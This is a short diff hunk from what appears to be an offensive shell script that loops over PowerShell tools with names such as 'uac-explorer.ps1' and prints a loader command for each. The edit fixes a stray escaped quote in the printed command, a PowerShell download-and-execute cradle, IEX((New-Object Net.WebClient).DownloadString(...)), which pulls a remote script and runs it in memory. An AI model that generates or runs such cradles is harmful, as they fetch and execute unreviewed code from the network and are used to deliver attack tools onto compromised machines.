@@ -66,7 +66,7 @@ for script in pu-explorer.ps1 wp-explorer.ps1 pn-explorer.ps1 uac-explorer.ps1 a
     echo "--------------------"
     
     # Method 1: Standard IEX with WebClient
-    print_command IEX((New-Object Net.WebClient).DownloadString('$url'))\"
+    print_command IEX((New-Object Net.WebClient).DownloadString('$url'))"
     echo
 done
 
